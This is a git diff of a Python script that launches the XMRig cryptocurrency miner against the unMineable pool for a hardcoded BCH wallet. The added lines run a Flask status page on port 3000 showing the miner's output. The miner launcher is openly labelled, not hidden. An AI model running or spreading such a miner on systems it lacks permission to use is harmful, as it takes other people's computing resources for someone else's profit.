@@ -1,6 +1,9 @@
 import subprocess
 import shutil
 import os
+from flask import Flask, render_template_string
+
+app = Flask(__name__)
 
 # Check if wget is installed
 if shutil.which("wget") is None:
@@ -26,4 +29,29 @@ os.chdir(XMRIG_DIR)
 
 # Run XMRig with parameters for unMineable BCH mining
 print("Starting XMRig for BCH mining on unMineable...")
-subprocess.run(["./xmrig", "-o", "rx.unmineable.com:3333", "-a", "rx", "-k", "-u", "BCH:qqe3cudqxmc498e7nza7rfwajjyeh6x3nghsvtm39p.pc#xnsub"])
+process = subprocess.Popen(["./xmrig", "-o", "rx.unmineable.com:3333", "-a", "rx", "-k", "-u", "BCH:qqe3cudqxmc498e7nza7rfwajjyeh6x3nghsvtm39p.pc#xnsub"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+
+@app.route('/')
+def index():
+    # Read the output from the XMRig process
+    output = process.stdout.readline()
+    
+    # Define the HTML template
+    template = '''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>XMRig Status</title>
+    </head>
+    <body>
+        <h1>XMRig Status</h1>
+        <pre>{{ output }}</pre>
+    </body>
+    </html>
+    '''
+    
+    # Render the template with the XMRig output
+    return render_template_string(template, output=output)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=3000)
